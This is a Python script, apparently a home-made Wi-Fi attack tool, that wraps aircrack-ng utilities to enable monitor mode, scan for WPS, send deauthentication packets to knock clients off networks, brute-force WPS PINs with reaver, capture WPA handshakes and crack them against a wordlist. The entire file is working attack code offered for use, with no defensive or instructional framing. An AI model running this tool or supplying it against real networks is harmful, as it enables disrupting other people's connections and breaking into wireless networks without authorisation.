import subprocess
import re
import argparse


class WirelessSecurityTool:
    def __init__(self, adapter):
        self.adapter = adapter

    def enable_monitor_mode(self):
        """Enable monitor mode"""
        print(f"Changing {self.adapter} to monitor mode")
        subprocess.run(["ifconfig", self.adapter, "down"])
        subprocess.run(["iwconfig", self.adapter, "mode", "monitor"])
        subprocess.run(["ifconfig", self.adapter, "up"])

    def check_wps(self):
        """Check for WPS enabled"""
        print(f"Using {self.adapter} to check for WPS")
        subprocess.run(["wash", "--interface", self.adapter])

    def deauth_attack(self, client_bssid, deauth_pack, client_mac):
        '''Deauth attack function'''
        print(f'Deauth attack against {client_bssid} on {client_mac} using {self.adapter}')
        subprocess.run(
            ['aireplay-ng', '--deauth', str(deauth_pack), '-a', client_bssid, '-c', client_mac, self.adapter],
            check=True)

    def capture_handshake(self):
        """Capture WPA handshake"""
        print("Capturing handshake")
        wifi_mac = input("[+] Input Wi-Fi MAC address: ")
        result = subprocess.check_output(["ifconfig", self.adapter], encoding="utf-8")
        output = re.search(r"([A-Za-z0-9]+(-[A-Za-z0-9]+)+)", result)
        print(output[0])
        adapter_mac = input("[+] Input adapter MAC: ")
        channel = input("[+] Input channel of Wi-Fi network: ")

        options = self.get_input()
        self.deauth_attack(options.client_bssid, options.deauth_pack, options.client_mac)

        subprocess.run(['reaver', '--bssid', wifi_mac, '--channel', channel, '--interface', self.adapter, '-vvv',
                        '--no-associate'])
        subprocess.run(['aireplay-ng', '-1', '30', '-a', wifi_mac, '-h', adapter_mac, self.adapter])

    def capture_handshake_process(self):
        """Capture WPA handshake process"""
        try:
            print("[+] Press Control + C to stop scan")
            subprocess.run(['airodump-ng', self.adapter])
        except KeyboardInterrupt:
            wifi_bssid = input("[+] Input BSSID of Wi-Fi: ")
            channel = input("[+] Input Wi-Fi channel: ")
            handshake_file = input("Enter name of handshake file: ")
            subprocess.run(
                ['airodump-ng', '--bssid', wifi_bssid, '--channel', channel, '--write', handshake_file, self.adapter])

    def run_wordlist_attack(self):
        handshake_file = input("[+] Input Handshake File Name: ")
        wordlist_file = input("[+] Input Wordlist File: ")
        subprocess.run(['aircrack-ng', handshake_file, '-w', wordlist_file])

    def run_wireless_security_tool(self):
        user_selection = self.get_user_selection()

        if user_selection == '1':
            try:
                self.enable_monitor_mode()
                self.check_wps()
            except KeyboardInterrupt:
                pass

            self.capture_handshake()
        elif user_selection == '2':
            try:
                self.capture_handshake_process()
            except KeyboardInterrupt:
                print("Running Wordlist attack")
                self.run_wordlist_attack()

    @staticmethod
    def get_user_selection():
        print("[+] Which vulnerability do you want to run:")
        print("1. WPS")
        print("2. Wordlist Attack")
        return input("Selection: ")

    @staticmethod
    def get_input():
        """Get input"""
        parser = argparse.ArgumentParser()
        parser.add_argument("-a", "--client_bssid", help="specify client BSSID")
        parser.add_argument("-p", "--deauth_pack", type=int, help="specify number of deauth packets")
        parser.add_argument("-c", "--client_mac", help="specify client MAC address")
        args = parser.parse_args()

        if not all([args.client_bssid, args.deauth_pack, args.client_mac]):
            parser.error("[-] Please provide all the required arguments. Use --help for more information.")

        return args


def main():
    adapter = input("[+] Input Wi-Fi adapter: ")
    tool = WirelessSecurityTool(adapter)
    tool.run_wireless_security_tool()


if __name__ == "__main__":
    main()